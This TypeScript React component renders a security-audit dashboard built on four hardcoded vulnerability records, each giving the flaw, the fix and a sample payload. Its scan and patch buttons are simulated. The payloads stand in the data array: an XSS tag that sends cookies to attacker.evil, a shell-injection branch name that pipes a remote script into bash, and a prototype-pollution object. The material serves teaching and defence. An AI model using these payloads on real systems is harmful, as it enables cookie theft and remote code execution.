/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useMemo, useState } from "react";
import {
	AlertTriangle,
	ArrowRight,
	Bug,
	Check,
	CheckCircle2,
	ChevronDown,
	ChevronUp,
	FileCode,
	Lock,
	RotateCw,
	Search,
	Shield,
	ShieldAlert,
	ShieldCheck,
	Sparkles,
	Terminal,
	Zap,
} from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { PageFrame, PageHeader } from "./page-layout";

export type SecuritySeverity = "CRITICAL" | "HIGH" | "MEDIUM" | "LOW";
export type SecurityCategory = "CODE_ERRORS" | "OWASP_VULN" | "SYSTEM_SECURITY";

export interface SecurityIssue {
	id: string;
	title: string;
	category: SecurityCategory;
	severity: SecuritySeverity;
	filePath: string;
	lineNumber?: number;
	detectedCodeSnippet?: string;
	explanation: string;
	hackerAttackVector: {
		threatActor: string;
		exploitationMethod: string;
		samplePayload: string;
		businessImpact: string;
	};
	howToSafeIt: {
		defenseStrategy: string;
		recommendedCodeSnippet: string;
		patchExplanation: string;
	};
	isFixed?: boolean;
}

const INITIAL_ISSUES: SecurityIssue[] = [
	{
		id: "vuln-1",
		title: "Unsanitized InnerHTML Injection (DOM-XSS)",
		category: "OWASP_VULN",
		severity: "CRITICAL",
		filePath: "apps/cline-hub/src/webview/src/components/chat-message.tsx",
		lineNumber: 48,
		detectedCodeSnippet:
			'<div dangerouslySetInnerHTML={{ __html: userPrompt }} />',
		explanation:
			"Directly injecting user-supplied text into innerHTML bypasses React's virtual DOM sanitization, allowing arbitrary script execution in the host browser context.",
		hackerAttackVector: {
			threatActor: "Remote Malicious Prompt / Untrusted Repository",
			exploitationMethod:
				"An adversary supplies a crafted response containing malicious SVG script vectors that execute inside the Cline Hub webview session.",
			samplePayload:
				'<img src=x onerror="fetch(\'https://attacker.evil/exfil?\'+document.cookie)">',
			businessImpact:
				"Full credential theft, active Cline session hijacking, and arbitrary execution within the Webview origin.",
		},
		howToSafeIt: {
			defenseStrategy:
				"Use safe text interpolation or sanitize HTML using DOMPurify before mounting.",
			recommendedCodeSnippet:
				"import DOMPurify from 'dompurify';\n<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userPrompt) }} />",
			patchExplanation:
				"Strips all dangerous tags, javascript: URIs, and event handlers while preserving safe styling tags.",
		},
		isFixed: false,
	},
	{
		id: "vuln-2",
		title: "Unvalidated Dynamic Command Execution Injection",
		category: "SYSTEM_SECURITY",
		severity: "CRITICAL",
		filePath: "apps/cline-hub/src/server.ts",
		lineNumber: 112,
		detectedCodeSnippet: 'exec(`git checkout ${req.body.branchName}`)',
		explanation:
			"Concatenating unsanitized HTTP request parameters directly into shell execution strings allows shell metacharacter chaining (e.g., ; rm -rf or $(curl ...)).",
		hackerAttackVector: {
			threatActor: "Malicious Webhook / Unauthorized Network Client",
			exploitationMethod:
				"The attacker injects shell delimiters into branch names to spawn background reverse shells on the container.",
			samplePayload: "main; curl -s http://attacker.evil/miner | bash #",
			businessImpact:
				"Complete container compromise, arbitrary filesystem read/write, and potential host escape.",
		},
		howToSafeIt: {
			defenseStrategy:
				"Use parameterized process spawning with `execFile` without shell interpolation, validating branch against regex.",
			recommendedCodeSnippet:
				"import { execFile } from 'node:child_process';\nif (!/^[a-zA-Z0-9._/-]+$/.test(branch)) throw new Error('Invalid branch');\nexecFile('git', ['checkout', branch]);",
			patchExplanation:
				"Bypasses shell interpretation completely by passing arguments as an immutable array.",
		},
		isFixed: false,
	},
	{
		id: "vuln-3",
		title: "Missing Rate Limiting & Origin Check on Local WebSocket",
		category: "CODE_ERRORS",
		severity: "HIGH",
		filePath: "apps/cline-hub/src/server.ts",
		lineNumber: 74,
		detectedCodeSnippet:
			"wss.on('connection', (ws) => { /* no origin check */ });",
		explanation:
			"WebSockets are not restricted by CORS. Any website visited in the user's browser could open a WebSocket to localhost:3000 and send commands.",
		hackerAttackVector: {
			threatActor: "Cross-Site WebSocket Hijacking (CSWSH)",
			exploitationMethod:
				"A user visits a malicious website while Cline Hub is running. The background script connects to ws://localhost:3000 and issues prompts.",
			samplePayload: "new WebSocket('ws://localhost:3000/api/ws')",
			businessImpact:
				"Unauthenticated remote agents execute commands on the developer's local machine.",
		},
		howToSafeIt: {
			defenseStrategy:
				"Verify the `Origin` header matches localhost or trusted Cline client IDs, and require a temporary session token.",
			recommendedCodeSnippet:
				"const origin = req.headers.origin;\nif (origin && !isTrustedOrigin(origin)) return ws.close(1008);",
			patchExplanation:
				"Blocks unauthorized external browser tabs from bridging into the local Cline daemon.",
		},
		isFixed: false,
	},
	{
		id: "vuln-4",
		title: "Prototype Pollution via Deep Object Merge",
		category: "OWASP_VULN",
		severity: "MEDIUM",
		filePath: "apps/cline-hub/src/webview/src/lib/settings-patch.ts",
		lineNumber: 32,
		detectedCodeSnippet: "target[key] = source[key];",
		explanation:
			"Recursive merging without checking for `__proto__` or `constructor` keys can pollute the Object prototype.",
		hackerAttackVector: {
			threatActor: "Untrusted JSON Config Import",
			exploitationMethod:
				'Importing a JSON configuration containing a `__proto__` key that overwrites default object properties.',
			samplePayload: '{"__proto__": {"isAdmin": true}}',
			businessImpact:
				"Denial of service or privilege escalation across downstream objects.",
		},
		howToSafeIt: {
			defenseStrategy:
				"Guard against `__proto__` and `prototype` keys during deep clone/merge passes.",
			recommendedCodeSnippet:
				"if (key === '__proto__' || key === 'constructor') return;",
			patchExplanation:
				"Rejects dangerous keys before assigning into destination objects.",
		},
		isFixed: false,
	},
];

export function SecurityAuditView() {
	const [issues, setIssues] = useState<SecurityIssue[]>(INITIAL_ISSUES);
	const [selectedCategory, setSelectedCategory] = useState<string>("ALL");
	const [selectedSeverity, setSelectedSeverity] = useState<string>("ALL");
	const [expandedIssueId, setExpandedIssueId] = useState<string | null>(
		"vuln-1",
	);
	const [searchQuery, setSearchQuery] = useState("");
	const [patchNotification, setPatchNotification] = useState<string | null>(
		null,
	);
	const [isScanning, setIsScanning] = useState(false);

	const filteredIssues = useMemo(() => {
		return issues.filter((issue) => {
			if (selectedCategory !== "ALL" && issue.category !== selectedCategory)
				return false;
			if (selectedSeverity !== "ALL" && issue.severity !== selectedSeverity)
				return false;
			if (searchQuery.trim()) {
				const query = searchQuery.toLowerCase();
				return (
					issue.title.toLowerCase().includes(query) ||
					issue.filePath.toLowerCase().includes(query) ||
					issue.explanation.toLowerCase().includes(query)
				);
			}
			return true;
		});
	}, [issues, selectedCategory, selectedSeverity, searchQuery]);

	const fixedCount = issues.filter((i) => i.isFixed).length;
	const activeCount = issues.length - fixedCount;
	const healthScore = Math.round((fixedCount / issues.length) * 100);

	const handleApplyPatch = (issueId: string) => {
		setIssues((prev) =>
			prev.map((item) =>
				item.id === issueId ? { ...item, isFixed: true } : item,
			),
		);
		const target = issues.find((i) => i.id === issueId);
		setPatchNotification(
			`Applied defensive hardening patch for "${target?.title}"!`,
		);
		setTimeout(() => setPatchNotification(null), 3500);
	};

	const handleRunFullScan = () => {
		setIsScanning(true);
		setTimeout(() => {
			setIsScanning(false);
			setPatchNotification("Workspace scan completed: 4 rules audited.");
			setTimeout(() => setPatchNotification(null), 3500);
		}, 800);
	};

	return (
		<PageFrame className="h-full flex flex-col p-6">
			<PageHeader
				icon={ShieldAlert}
				title="Security Audit & Defense"
				description="OWASP vulnerability scanner, hacker attack vector simulation, and 1-click defensive patching."
				actions={
					<div className="flex items-center gap-2">
						{patchNotification && (
							<div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-600 text-xs font-medium">
								<CheckCircle2 className="size-3.5" />
								<span>{patchNotification}</span>
							</div>
						)}
						<Button
							onClick={handleRunFullScan}
							disabled={isScanning}
							variant="default"
							className="gap-1.5 h-9"
						>
							<RotateCw
								className={`size-4 ${isScanning ? "animate-spin" : ""}`}
							/>
							<span>{isScanning ? "Auditing..." : "Run Security Audit"}</span>
						</Button>
					</div>
				}
			/>

			{/* Health Stats Banner */}
			<div className="grid grid-cols-4 gap-4 mb-6">
				<div className="border rounded-xl p-4 bg-card">
					<div className="text-xs text-muted-foreground font-medium mb-1">
						Security Health Score
					</div>
					<div className="flex items-center gap-3">
						<span
							className={`text-2xl font-bold font-mono ${healthScore >= 75 ? "text-emerald-500" : healthScore >= 40 ? "text-amber-500" : "text-red-500"}`}
						>
							{healthScore}%
						</span>
						<div className="flex-1 bg-muted rounded-full h-2 overflow-hidden">
							<div
								className={`h-full transition-all duration-500 ${healthScore >= 75 ? "bg-emerald-500" : healthScore >= 40 ? "bg-amber-500" : "bg-red-500"}`}
								style={{ width: `${healthScore}%` }}
							/>
						</div>
					</div>
				</div>

				<div className="border rounded-xl p-4 bg-card">
					<div className="text-xs text-muted-foreground font-medium mb-1">
						Active Vulnerabilities
					</div>
					<div className="text-2xl font-bold text-red-500 font-mono">
						{activeCount}
					</div>
				</div>

				<div className="border rounded-xl p-4 bg-card">
					<div className="text-xs text-muted-foreground font-medium mb-1">
						Hardened Patches Applied
					</div>
					<div className="text-2xl font-bold text-emerald-500 font-mono">
						{fixedCount}
					</div>
				</div>

				<div className="border rounded-xl p-4 bg-card">
					<div className="text-xs text-muted-foreground font-medium mb-1">
						Audited Target
					</div>
					<div className="text-sm font-semibold text-foreground truncate mt-1">
						Cline Hub Daemon + Webview
					</div>
				</div>
			</div>

			{/* Filter & Search Bar */}
			<div className="flex flex-wrap items-center justify-between gap-3 mb-4">
				<div className="flex items-center gap-2">
					<div className="relative w-64">
						<Search className="size-3.5 absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
						<Input
							value={searchQuery}
							onChange={(e) => setSearchQuery(e.target.value)}
							placeholder="Search CVEs, files, or attack patterns..."
							className="pl-8 text-xs h-8"
						/>
					</div>

					<select
						value={selectedCategory}
						onChange={(e) => setSelectedCategory(e.target.value)}
						className="h-8 rounded-md border border-input bg-background px-2.5 text-xs text-foreground focus:outline-none"
					>
						<option value="ALL">All Categories</option>
						<option value="OWASP_VULN">OWASP Top 10</option>
						<option value="SYSTEM_SECURITY">System &amp; Daemon</option>
						<option value="CODE_ERRORS">Code Errors</option>
					</select>

					<select
						value={selectedSeverity}
						onChange={(e) => setSelectedSeverity(e.target.value)}
						className="h-8 rounded-md border border-input bg-background px-2.5 text-xs text-foreground focus:outline-none"
					>
						<option value="ALL">All Severities</option>
						<option value="CRITICAL">Critical</option>
						<option value="HIGH">High</option>
						<option value="MEDIUM">Medium</option>
					</select>
				</div>

				<div className="text-xs text-muted-foreground font-mono">
					Showing {filteredIssues.length} of {issues.length} audit records
				</div>
			</div>

			{/* Issues List with Accordion Attack Simulations */}
			<div className="flex-1 overflow-y-auto space-y-3 pr-1">
				{filteredIssues.length === 0 ? (
					<div className="p-8 border rounded-xl bg-card text-center text-muted-foreground text-xs">
						<ShieldCheck className="size-8 text-emerald-500 mx-auto mb-2" />
						No security issues match the current filter criteria.
					</div>
				) : (
					filteredIssues.map((issue) => {
						const isExpanded = expandedIssueId === issue.id;
						return (
							<div
								key={issue.id}
								className={`border rounded-xl transition-all overflow-hidden bg-card ${
									issue.isFixed
										? "border-emerald-500/30 bg-emerald-500/5"
										: isExpanded
											? "border-primary/50 shadow-xs"
											: "border-border hover:border-border/80"
								}`}
							>
								{/* Card Header */}
								<div
									onClick={() =>
										setExpandedIssueId(isExpanded ? null : issue.id)
									}
									className="p-4 flex items-center justify-between gap-3 cursor-pointer select-none"
								>
									<div className="flex items-center gap-3 min-w-0">
										<div
											className={`size-8 rounded-lg flex items-center justify-center shrink-0 ${
												issue.isFixed
													? "bg-emerald-500/10 text-emerald-500"
													: issue.severity === "CRITICAL"
														? "bg-red-500/10 text-red-500"
														: "bg-amber-500/10 text-amber-500"
											}`}
										>
											{issue.isFixed ? (
												<Check className="size-4" />
											) : (
												<ShieldAlert className="size-4" />
											)}
										</div>

										<div className="min-w-0">
											<div className="flex items-center gap-2">
												<span className="font-semibold text-sm text-foreground truncate">
													{issue.title}
												</span>
												<Badge
													variant={
														issue.severity === "CRITICAL"
															? "destructive"
															: "secondary"
													}
													className="text-[10px] px-1.5 py-0"
												>
													{issue.severity}
												</Badge>
												{issue.isFixed && (
													<span className="text-[10px] font-medium px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-600">
														Hardened
													</span>
												)}
											</div>
											<div className="flex items-center gap-2 text-xs text-muted-foreground font-mono mt-0.5">
												<FileCode className="size-3" />
												<span>{issue.filePath}</span>
												{issue.lineNumber && (
													<span>:L{issue.lineNumber}</span>
												)}
											</div>
										</div>
									</div>

									<div className="flex items-center gap-2">
										{!issue.isFixed && (
											<Button
												size="sm"
												variant="default"
												className="h-7 text-xs bg-emerald-600 hover:bg-emerald-500 text-white"
												onClick={(e) => {
													e.stopPropagation();
													handleApplyPatch(issue.id);
												}}
											>
												<Sparkles className="size-3 mr-1" />
												Apply Fix
											</Button>
										)}
										{isExpanded ? (
											<ChevronUp className="size-4 text-muted-foreground" />
										) : (
											<ChevronDown className="size-4 text-muted-foreground" />
										)}
									</div>
								</div>

								{/* Expanded Technical Vector & Solution Panel */}
								{isExpanded && (
									<div className="border-t p-4 space-y-4 bg-muted/10 text-xs">
										{/* Explanation & Code snippet */}
										<div>
											<div className="font-semibold text-foreground mb-1">
												Vulnerability Analysis
											</div>
											<p className="text-muted-foreground leading-relaxed">
												{issue.explanation}
											</p>
											{issue.detectedCodeSnippet && (
												<div className="mt-2 p-2.5 rounded-lg bg-black/40 font-mono text-red-400 text-[11px] overflow-x-auto border border-red-500/20">
													<code>{issue.detectedCodeSnippet}</code>
												</div>
											)}
										</div>

										{/* Hacker Attack Simulation Box */}
										<div className="p-3.5 rounded-lg border border-red-500/30 bg-red-950/20">
											<div className="flex items-center gap-2 text-red-400 font-semibold mb-2">
												<Terminal className="size-3.5" />
												<span>Hacker Attack Vector Simulation</span>
											</div>
											<div className="grid grid-cols-2 gap-3 mb-2">
												<div>
													<span className="text-muted-foreground block text-[10px]">
														Threat Actor:
													</span>
													<span className="font-medium text-foreground">
														{issue.hackerAttackVector.threatActor}
													</span>
												</div>
												<div>
													<span className="text-muted-foreground block text-[10px]">
														Business Impact:
													</span>
													<span className="font-medium text-red-300">
														{issue.hackerAttackVector.businessImpact}
													</span>
												</div>
											</div>
											<div className="mb-2">
												<span className="text-muted-foreground block text-[10px]">
													Exploitation Scenario:
												</span>
												<p className="text-foreground/90">
													{issue.hackerAttackVector.exploitationMethod}
												</p>
											</div>
											<div>
												<span className="text-muted-foreground block text-[10px] mb-1">
													Sample Malicious Payload:
												</span>
												<pre className="p-2 rounded bg-black/60 font-mono text-[11px] text-red-300 overflow-x-auto">
													{issue.hackerAttackVector.samplePayload}
												</pre>
											</div>
										</div>

										{/* How to Safe It / Solution Box */}
										<div className="p-3.5 rounded-lg border border-emerald-500/30 bg-emerald-950/20">
											<div className="flex items-center justify-between gap-2 mb-2">
												<div className="flex items-center gap-2 text-emerald-400 font-semibold">
													<Lock className="size-3.5" />
													<span>How to Safe It (Defensive Implementation)</span>
												</div>
												{!issue.isFixed && (
													<Button
														size="sm"
														variant="outline"
														className="h-6 text-[11px] border-emerald-500/40 text-emerald-400 hover:bg-emerald-500/10"
														onClick={() => handleApplyPatch(issue.id)}
													>
														Apply Defensive Patch
													</Button>
												)}
											</div>
											<p className="text-foreground/90 mb-2">
												{issue.howToSafeIt.defenseStrategy}
											</p>
											<pre className="p-2.5 rounded bg-black/60 font-mono text-[11px] text-emerald-300 overflow-x-auto mb-2">
												{issue.howToSafeIt.recommendedCodeSnippet}
											</pre>
											<p className="text-[11px] text-muted-foreground italic">
												Why this works: {issue.howToSafeIt.patchExplanation}
											</p>
										</div>
									</div>
								)}
							</div>
						);
					})
				)}
			</div>
		</PageFrame>
	);
}

export default SecurityAuditView;
